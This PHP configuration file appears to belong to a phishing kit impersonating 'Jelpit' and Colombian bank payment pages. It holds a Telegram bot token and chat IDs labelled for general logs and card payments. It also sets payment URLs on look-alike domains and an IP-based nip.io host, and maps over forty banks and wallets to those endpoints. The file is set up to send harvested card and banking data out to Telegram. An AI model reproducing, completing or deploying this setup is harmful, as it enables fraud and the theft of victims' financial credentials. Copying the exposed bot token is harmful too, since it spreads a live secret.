<?php
// =====================================================
// Configuración Jelpit — edita sólo este archivo
// =====================================================
require_once __DIR__ . '/ban_check.php';

// ── Telegram ──────────────────────────────────────────
define('TG_TOKEN', '8840764725:AAGpJvwQ-BedbwvKzObO00RoUKU8TkBKFQo');
define('TG_CHAT', '-4955190747');   // Chat principal (logs generales) 
define('TG_CHAT_CC', '-5235238333');   // Chat pagos con tarjeta

//define('TG_CHAT', '235905376');   // Chat principal (logs generales) 
//define('TG_CHAT_CC', '-5131767520');   // Chat pagos con tarjeta


// ── PSE ───────────────────────────────────────────────
define('PSE_BASE', 'https://pagosonline-pse.vercel.app');
define('RECAUDOFALL_BASE', 'https://recaudofall.94.250.202.215.nip.io/generar-wompi');
define('NEQUI_URL', 'https://nequi.col-online.cc/envia/nequi?k=8jiyMZckw4E2nYA6#8jiyMZckw4E2nYA6');

// Bancos existentes → vercel (/sites/{slug}/manager/{id})
$PSE_BANKS = [
    'bancolombia' => ['slug' => 'bc', 'id' => '109'],
    'bogota' => ['slug' => 'bg', 'id' => '109'],
    'nequi' => ['slug' => 'nq', 'id' => '109'],
    'popular' => ['slug' => 'pop', 'id' => '109'],
    'caja-social' => ['slug' => 'cj', 'id' => '109'],
];

// Bancos → recaudofall (valor exacto esperado por el endpoint)
$PSE_BANKS_RECAUDOFALL = [
    'daviplata' => 'daviplata',
    'davivienda' => 'davivienda',
    'avvillas' => 'av villas',
    'popular' => 'popular',
    'bbva' => 'bbva',
    'occidente' => 'occidente',
    'itau' => 'itau',
    'agrario' => 'agrario',
    'gnb' => 'gnb',
    'pichincha' => 'pichincha',
    'falabella' => 'falabella',
    'union' => 'union',
    'santander' => 'santander',
    'serfinanza' => 'serfinanza',
    'finandina' => 'finandina',
    'mundo-mujer' => 'mundo mujer',
    'coopcentral' => 'coopcentral',
    'bancoomeva' => 'bancoomeva',
    'bancamia' => 'bancamia',
    'nu' => 'nu',
    'dale' => 'dale',
    'davibank-s.a.' => 'davibank',
    'lulo' => 'lulo',
    'movii' => 'movii',
    'rappipay' => 'rappipay',
    'uala' => 'uala',
    'bold' => 'bold',
    'coink' => 'coink',
    'iris' => 'iris',
    'global66' => 'global66',
    'ding' => 'ding',
    'paycash' => 'paycash',
    'powwi' => 'powwi',
    'citibank' => 'citibank',
    'coltefinanciera' => 'coltefinanciera',
    'cotrafa' => 'cotrafa',
    'confiar' => 'confiar',
    'crezcamos' => 'crezcamos',
    'accion' => 'accion',
    'alianza' => 'alianza',
    'ban100' => 'ban100',
    'cfa' => 'cfa',
    'jfk' => 'jfk',
    'juriscoop' => 'juriscoop',
];
